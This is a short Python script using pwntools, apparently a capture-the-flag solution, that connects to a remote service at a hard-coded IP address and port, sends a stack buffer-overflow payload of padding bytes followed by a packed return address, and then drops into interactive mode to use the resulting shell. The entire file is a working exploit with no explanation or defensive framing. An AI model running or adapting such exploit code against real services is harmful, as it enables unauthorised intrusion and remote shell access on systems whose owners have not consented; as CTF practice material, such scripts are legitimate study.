from pwn import *
import time
import struct
# Connect to the remote service
p = remote('35.184.182.18', 32003)

time.sleep(2)

# Prepare the payload
payload = b'A' * 50 + b'B' * 22 + struct.pack('<Q', 0x0000000000401166)

# Send the payload
print("[*] Sending payload...")
p.send(payload)

# Optional: Wait a little for the service to respond after sending the payload
time.sleep(1)

# Switch to interactive mode to interact with the shell or service
print("[*] Switching to interactive mode...")
p.interactive()
